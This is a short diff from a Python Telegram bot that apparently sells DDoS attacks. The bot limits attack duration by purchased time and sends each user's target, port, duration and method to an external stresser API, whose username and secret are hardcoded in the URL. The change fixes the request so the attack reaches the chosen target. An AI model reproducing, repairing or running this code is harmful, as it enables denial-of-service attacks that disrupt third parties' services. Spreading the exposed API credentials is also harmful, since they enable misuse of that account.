@@ -126,7 +126,7 @@ def handle_message(msg):
                 bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more using less attack time.'.format(max_duration))
                 return
                 
-            url = f'https://pqtsec.cf/api/attack?username=cilentapihunter11&secret=khidsfdsfndsaqplfsda255&host={host}&port={port}&time={duration}&method={method}'
+            url = f'https://pqtsec.cf/api/attack?username=cilentapihunter11&secret=khidsfdsfndsaqplfsda255&host={target}&port={port}&time={duration}&method={method}'
             response = requests.get(url)
 
             bot.sendMessage(chat_id, 'Attack sent!!\n\nTarget: {}\nPort: {}\nDuration: {}\nMethod: {}'.format(target, port, duration, method))
